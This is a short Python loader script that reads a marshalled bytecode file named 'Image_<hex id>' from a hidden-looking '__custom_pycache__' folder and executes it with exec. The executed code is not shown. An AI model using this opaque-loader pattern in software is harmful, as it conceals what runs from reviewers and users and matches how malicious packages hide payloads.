
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Image_4d727c375f1b4e3f8f29ca275aa139f5.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
